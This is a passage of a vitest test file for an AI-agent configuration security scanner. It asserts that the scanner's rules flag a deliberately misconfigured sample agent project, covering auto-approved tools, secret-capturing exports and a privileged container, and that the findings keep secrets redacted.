import { describe, expect, it } from "vitest";
import fs from "node:fs/promises";
import path from "node:path";
import { detectSurfaces } from "../src/scanner/detect.js";
import { walkProject } from "../src/scanner/walk.js";
import { loadRules, runRules } from "../src/rules/engine.js";
import { scanProject } from "../src/scanner/scan.js";

describe("rule engine", () => {
  it("runs built-in YAML rules over normalized manifest objects", async () => {
    const fixtureRoot = path.resolve("examples/vulnerable-agent");
    const files = await walkProject({
      root_path: fixtureRoot,
      output_path: ".agentcsp",
      formats: ["json", "md"],
      include_hidden: true,
      include_logs: false,
      max_file_size_bytes: 1024 * 1024,
      max_files: 5000,
      quiet: true
    });
    const surfaces = await detectSurfaces(files);
    const rules = await loadRules(path.resolve("rules"));
    const findings = runRules(surfaces, rules);

    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-TOOL-001")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-TOOL-002")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-TOOL-003")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-TOOL-004")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-TOOL-005")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-TOOL-006")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-TOOL-007")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-TOOL-008")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-TOOL-009")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-TOOL-010")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-TOOL-011")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-TOOL-012")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-MCP-001")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-MCP-002")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-MCP-003")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-MCP-004")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-MCP-005")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-MCP-006")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-MCP-007")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-MCP-008")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-MCP-009")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-MCP-010")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-MCP-011")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-001")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-002")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-003")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-004")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-005")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-006")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-007")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-008")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-009")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-086")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-010")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-083")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-011")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-012")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-110")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-013")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-014")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-094")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-015")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-080")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-016")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-017")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-096")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-018")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-072")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-019")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-098")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-020")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-077")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-021")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-090")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-022")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-023")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-024")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-093")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-025")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-085")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-026")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-107")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-084")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-027")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-081")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-028")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-089")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-029")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-050")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-051")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-108")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-052")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-078")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-053")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-106")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-054")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-099")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-055")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-056")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-101")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-057")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-113")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-058")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-074")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-059")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-100")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-060")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-112")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-061")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-062")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-092")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-063")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-076")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-064")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-091")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-065")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-104")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-066")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-067")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-103")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-068")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-109")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-069")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-111")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-070")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-071")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-030")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-088")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-031")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-087")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-032")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-082")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-033")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-034")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-035")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-036")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-114")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-037")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-102")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-038")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-039")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-079")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-040")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-095")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-041")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-075")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-115")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-042")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-043")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-044")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-097")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-045")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-105")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-046")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-073")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-047")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-048")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RUNTIME-049")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-CICD-002")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-AUTOMATION-001")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-AUTOMATION-002")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-AUTOMATION-003")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-CURSOR-001")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-INSTRUCTION-001")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-PROMPT-001")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-PROMPT-002")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-PROMPT-003")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-PROMPT-004")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RAG-001")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RAG-002")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RAG-003")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RAG-004")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RAG-005")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-RAG-006")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-SKILL-001")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-SUPPLYCHAIN-001")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-SUPPLYCHAIN-002")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-SUPPLYCHAIN-003")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-MEMORY-002")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-MEMORY-003")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-MEMORY-004")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-MEMORY-005")).toBe(true);
    expect(findings.some((finding) => finding.rule_id === "AGENTCSP-MEMORY-006")).toBe(true);
    expect(findings.some((finding) => finding.severity === "critical")).toBe(true);
    expect(findings.some((finding) => finding.confidence === "very_high")).toBe(true);
    expect(findings.find((finding) => finding.rule_id === "AGENTCSP-RUNTIME-001")?.confidence).toBe("very_high");
    const runtimeMcpFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-003");
    expect(runtimeMcpFindings.map((finding) => finding.matched_object.path).sort()).toEqual([
      ".claude/settings.json",
      ".codex/config.toml"
    ]);
    expect(runtimeMcpFindings.every((finding) => finding.confidence === "very_high")).toBe(true);
    const runtimeAutoApprovedFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-004");
    expect(runtimeAutoApprovedFindings).toHaveLength(1);
    expect(runtimeAutoApprovedFindings[0]?.matched_object.path).toBe(".claude/settings.json");
    expect(runtimeAutoApprovedFindings[0]?.matched_object.metadata.permission_allowlist).toEqual(
      expect.arrayContaining(["Bash", "WebFetch", "mcp:filesystem-admin"])
    );
    expect(runtimeAutoApprovedFindings[0]?.confidence).toBe("very_high");
    expect(JSON.stringify(runtimeAutoApprovedFindings[0])).not.toContain("npm run deploy");
    expect(JSON.stringify(runtimeAutoApprovedFindings[0])).not.toContain("${ANTHROPIC_API_KEY}");
    const runtimeAutoApprovedReleaseFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-005");
    expect(runtimeAutoApprovedReleaseFindings).toHaveLength(1);
    expect(runtimeAutoApprovedReleaseFindings[0]?.matched_object.path).toBe(".claude/settings.json");
    expect(runtimeAutoApprovedReleaseFindings[0]?.matched_object.metadata.referenced_release_package_scripts).toEqual([
      "package-script:deploy"
    ]);
    expect(runtimeAutoApprovedReleaseFindings[0]?.confidence).toBe("very_high");
    expect(JSON.stringify(runtimeAutoApprovedReleaseFindings[0])).not.toContain("npm run deploy");
    const runtimeDestructiveMcpFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-006");
    expect(runtimeDestructiveMcpFindings).toHaveLength(1);
    expect(runtimeDestructiveMcpFindings[0]?.matched_object.path).toBe(".claude/settings.json");
    expect(runtimeDestructiveMcpFindings[0]?.matched_object.metadata.auto_approved_destructive_mcp_tool_refs).toEqual([
      "mcp:filesystem_admin/delete_file"
    ]);
    expect(runtimeDestructiveMcpFindings[0]?.confidence).toBe("very_high");
    expect(JSON.stringify(runtimeDestructiveMcpFindings[0])).not.toContain("mcp__filesystem-admin__delete_file");
    const runtimeBroadWebFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-007");
    expect(runtimeBroadWebFindings).toHaveLength(1);
    expect(runtimeBroadWebFindings[0]?.matched_object.path).toBe(".claude/settings.json");
    expect(runtimeBroadWebFindings[0]?.matched_object.metadata.auto_approved_network_tools).toEqual(["WebFetch"]);
    expect(runtimeBroadWebFindings[0]?.matched_object.metadata.auto_approved_network_scope_kinds).toEqual([
      "wildcard_domain"
    ]);
    expect(runtimeBroadWebFindings[0]?.confidence).toBe("very_high");
    expect(JSON.stringify(runtimeBroadWebFindings[0])).not.toContain("domain:*");
    const runtimeTelemetryFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-008");
    expect(runtimeTelemetryFindings).toHaveLength(1);
    expect(runtimeTelemetryFindings[0]?.matched_object.path).toBe("observability/agent-tracing.yaml");
    expect(runtimeTelemetryFindings[0]?.matched_object.metadata).toMatchObject({
      ai_telemetry_provider: "langsmith",
      ai_telemetry_remote_export: true,
      ai_telemetry_sensitive_capture: true,
      ai_telemetry_redaction_disabled: true
    });
    expect(runtimeTelemetryFindings[0]?.severity).toBe("critical");
    expect(runtimeTelemetryFindings[0]?.confidence).toBe("very_high");
    expect(runtimeTelemetryFindings[0]?.recommended_control).toBe("redact");
    expect(JSON.stringify(runtimeTelemetryFindings[0])).not.toContain("${LANGSMITH_API_KEY}");
    expect(JSON.stringify(runtimeTelemetryFindings[0])).not.toContain("api.smith.langchain.com");
    const runtimePublicTelemetryFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-047");
    expect(runtimePublicTelemetryFindings).toHaveLength(1);
    expect(runtimePublicTelemetryFindings[0]?.matched_object.path).toBe("observability/agent-tracing.yaml");
    expect(runtimePublicTelemetryFindings[0]?.matched_object.metadata).toMatchObject({
      ai_telemetry_provider: "langsmith",
      ai_telemetry_remote_export: true,
      ai_telemetry_sensitive_capture: true,
      ai_telemetry_redaction_disabled: true,
      ai_telemetry_public_access: true,
      ai_telemetry_shared_workspace: true,
      ai_telemetry_access_control_disabled: true,
      ai_telemetry_approval_required: false
    });
    expect(runtimePublicTelemetryFindings[0]?.severity).toBe("critical");
    expect(runtimePublicTelemetryFindings[0]?.confidence).toBe("very_high");
    expect(runtimePublicTelemetryFindings[0]?.recommended_control).toBe("redact");
    expect(JSON.stringify(runtimePublicTelemetryFindings[0])).not.toContain("${LANGSMITH_API_KEY}");
    expect(JSON.stringify(runtimePublicTelemetryFindings[0])).not.toContain("api.smith.langchain.com");
    expect(JSON.stringify(runtimePublicTelemetryFindings[0])).not.toContain("customer-support-agent");
    expect(JSON.stringify(runtimePublicTelemetryFindings[0])).not.toContain("customer-support-observability");
    expect(JSON.stringify(runtimePublicTelemetryFindings[0])).not.toContain("external_support_vendor");
    const runtimeArtifactExportFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-024");
    expect(runtimeArtifactExportFindings).toHaveLength(1);
    expect(runtimeArtifactExportFindings[0]?.matched_object.path).toBe("artifacts/run-export.yaml");
    expect(runtimeArtifactExportFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_agent_artifact_export_config: true,
      agent_artifact_export_provider: "s3",
      agent_artifact_export_remote: true,
      agent_artifact_export_public_access: true,
      agent_artifact_export_sensitive_capture: true,
      agent_artifact_export_redaction_disabled: true,
      agent_artifact_export_secret_capture: true
    });
    expect(runtimeArtifactExportFindings[0]?.matched_object.metadata.agent_artifact_export_capture_categories).toEqual([
      "browser_artifact",
      "memory_context",
      "prompt_context",
      "retrieval_context",
      "secret_material",
      "tool_output"
    ]);
    expect(runtimeArtifactExportFindings[0]?.severity).toBe("critical");
    expect(runtimeArtifactExportFindings[0]?.confidence).toBe("very_high");
    expect(runtimeArtifactExportFindings[0]?.recommended_control).toBe("redact");
    expect(JSON.stringify(runtimeArtifactExportFindings[0])).not.toContain("${ARTIFACT_EXPORT_TOKEN}");
    expect(JSON.stringify(runtimeArtifactExportFindings[0])).not.toContain("agentcsp-demo-public-artifacts");
    expect(JSON.stringify(runtimeArtifactExportFindings[0])).not.toContain("artifacts.agentcsp-demo.example.invalid");
    expect(JSON.stringify(runtimeArtifactExportFindings[0])).not.toContain("artifact_customer_email");
    expect(JSON.stringify(runtimeArtifactExportFindings[0])).not.toContain("artifact_account_number");
    expect(JSON.stringify(runtimeArtifactExportFindings[0])).not.toContain("confidential_ticket_context");
    const runtimeArtifactRetentionFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-093");
    expect(runtimeArtifactRetentionFindings).toHaveLength(1);
    expect(runtimeArtifactRetentionFindings[0]?.matched_object.path).toBe("artifacts/run-export.yaml");
    expect(runtimeArtifactRetentionFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_agent_artifact_export_config: true,
      agent_artifact_export_provider: "s3",
      agent_artifact_export_remote: true,
      agent_artifact_export_public_access: true,
      agent_artifact_export_write_enabled: true,
      agent_artifact_export_retention_enabled: true,
      agent_artifact_export_prompt_capture: true,
      agent_artifact_export_tool_output_capture: true,
      agent_artifact_export_browser_capture: true,
      agent_artifact_export_retrieval_capture: true,
      agent_artifact_export_memory_capture: true,
      agent_artifact_export_secret_capture: true,
      agent_artifact_export_sensitive_capture: true,
      agent_artifact_export_pii_capture: true,
      agent_artifact_export_redaction_disabled: true,
      agent_artifact_export_approval_required: false
    });
    expect(runtimeArtifactRetentionFindings[0]?.matched_object.metadata.agent_artifact_export_capture_categories).toEqual([
      "browser_artifact",
      "memory_context",
      "prompt_context",
      "retrieval_context",
      "secret_material",
      "tool_output"
    ]);
    expect(runtimeArtifactRetentionFindings[0]?.severity).toBe("critical");
    expect(runtimeArtifactRetentionFindings[0]?.confidence).toBe("very_high");
    expect(runtimeArtifactRetentionFindings[0]?.recommended_control).toBe("quarantine");
    expect(JSON.stringify(runtimeArtifactRetentionFindings[0])).not.toContain("${ARTIFACT_EXPORT_TOKEN}");
    expect(JSON.stringify(runtimeArtifactRetentionFindings[0])).not.toContain("agentcsp-demo-public-artifacts");
    expect(JSON.stringify(runtimeArtifactRetentionFindings[0])).not.toContain("artifacts.agentcsp-demo.example.invalid");
    expect(JSON.stringify(runtimeArtifactRetentionFindings[0])).not.toContain("artifact_customer_email");
    expect(JSON.stringify(runtimeArtifactRetentionFindings[0])).not.toContain("artifact_account_number");
    expect(JSON.stringify(runtimeArtifactRetentionFindings[0])).not.toContain("confidential_ticket_context");
    const runtimeWebhookEgressFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-025");
    expect(runtimeWebhookEgressFindings).toHaveLength(1);
    expect(runtimeWebhookEgressFindings[0]?.matched_object.path).toBe("webhooks/model-callbacks.yaml");
    expect(runtimeWebhookEgressFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_agent_webhook_egress_config: true,
      agent_webhook_egress_provider: "generic_webhook",
      agent_webhook_egress_remote: true,
      agent_webhook_egress_external_write_enabled: true,
      agent_webhook_egress_untrusted_input: true,
      agent_webhook_egress_sensitive_payload: true,
      agent_webhook_egress_redaction_disabled: true,
      agent_webhook_egress_approval_required: false
    });
    expect(runtimeWebhookEgressFindings[0]?.matched_object.metadata.agent_webhook_egress_payload_categories).toEqual([
      "browser_context",
      "memory_context",
      "model_output",
      "prompt_context",
      "retrieval_context",
      "secret_material",
      "tool_output"
    ]);
    expect(runtimeWebhookEgressFindings[0]?.severity).toBe("critical");
    expect(runtimeWebhookEgressFindings[0]?.confidence).toBe("very_high");
    expect(runtimeWebhookEgressFindings[0]?.recommended_control).toBe("require_approval");
    expect(JSON.stringify(runtimeWebhookEgressFindings[0])).not.toContain("${AGENT_WEBHOOK_TOKEN}");
    expect(JSON.stringify(runtimeWebhookEgressFindings[0])).not.toContain("callback.agentcsp-demo.example.invalid");
    expect(JSON.stringify(runtimeWebhookEgressFindings[0])).not.toContain("webhook_customer_email");
    expect(JSON.stringify(runtimeWebhookEgressFindings[0])).not.toContain("webhook_account_number");
    expect(JSON.stringify(runtimeWebhookEgressFindings[0])).not.toContain("confidential_callback_summary");
    const runtimeWebhookRetryFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-085");
    expect(runtimeWebhookRetryFindings).toHaveLength(1);
    expect(runtimeWebhookRetryFindings[0]?.matched_object.path).toBe("webhooks/model-callbacks.yaml");
    expect(runtimeWebhookRetryFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_agent_webhook_egress_config: true,
      agent_webhook_egress_provider: "generic_webhook",
      agent_webhook_egress_remote: true,
      agent_webhook_egress_external_write_enabled: true,
      agent_webhook_egress_auth_header_redacted: true,
      agent_webhook_egress_model_output_payload: true,
      agent_webhook_egress_tool_output_payload: true,
      agent_webhook_egress_retrieval_payload: true,
      agent_webhook_egress_memory_payload: true,
      agent_webhook_egress_browser_payload: true,
      agent_webhook_egress_secret_payload: true,
      agent_webhook_egress_sensitive_payload: true,
      agent_webhook_egress_pii_payload: true,
      agent_webhook_egress_untrusted_input: true,
      agent_webhook_egress_redaction_disabled: true,
      agent_webhook_egress_retry_enabled: true,
      agent_webhook_egress_approval_required: false
    });
    expect(runtimeWebhookRetryFindings[0]?.matched_object.metadata.agent_webhook_egress_payload_categories).toEqual([
      "browser_context",
      "memory_context",
      "model_output",
      "prompt_context",
      "retrieval_context",
      "secret_material",
      "tool_output"
    ]);
    expect(runtimeWebhookRetryFindings[0]?.severity).toBe("critical");
    expect(runtimeWebhookRetryFindings[0]?.confidence).toBe("very_high");
    expect(runtimeWebhookRetryFindings[0]?.recommended_control).toBe("quarantine");
    expect(JSON.stringify(runtimeWebhookRetryFindings[0])).not.toContain("${AGENT_WEBHOOK_TOKEN}");
    expect(JSON.stringify(runtimeWebhookRetryFindings[0])).not.toContain("Authorization");
    expect(JSON.stringify(runtimeWebhookRetryFindings[0])).not.toContain("callback.agentcsp-demo.example.invalid");
    expect(JSON.stringify(runtimeWebhookRetryFindings[0])).not.toContain("model_generated_response");
    expect(JSON.stringify(runtimeWebhookRetryFindings[0])).not.toContain("untrusted_customer_ticket");
    expect(JSON.stringify(runtimeWebhookRetryFindings[0])).not.toContain("webhook_customer_email");
    expect(JSON.stringify(runtimeWebhookRetryFindings[0])).not.toContain("webhook_account_number");
    expect(JSON.stringify(runtimeWebhookRetryFindings[0])).not.toContain("confidential_callback_summary");
    const runtimeContainerFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-026");
    expect(runtimeContainerFindings).toHaveLength(1);
    expect(runtimeContainerFindings[0]?.matched_object.path).toBe("runtime/agent-container.yaml");
    expect(runtimeContainerFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_agent_container_runtime_config: true,
      agent_container_provider: "docker",
      agent_container_privileged: true,
      agent_container_docker_socket_mount: true,
      agent_container_host_path_mount: true,
      agent_container_host_network: true,
      agent_container_untrusted_input: true,
      agent_container_secret_env_exposure: true,
      agent_container_approval_required: false
    });
    expect(runtimeContainerFindings[0]?.matched_object.metadata.agent_container_mount_kinds).toEqual([
      "credential_path",
      "docker_socket",
      "host_path",
      "host_root",
      "sensitive_host_path",
      "writable_host_path"
    ]);
    expect(runtimeContainerFindings[0]?.matched_object.metadata.agent_container_capability_categories).toEqual([
      "net_admin",
      "privileged_mode",
      "sys_admin"
    ]);
    expect(runtimeContainerFindings[0]?.severity).toBe("critical");
    expect(runtimeContainerFindings[0]?.confidence).toBe("very_high");
    expect(runtimeContainerFindings[0]?.recommended_control).toBe("deny");
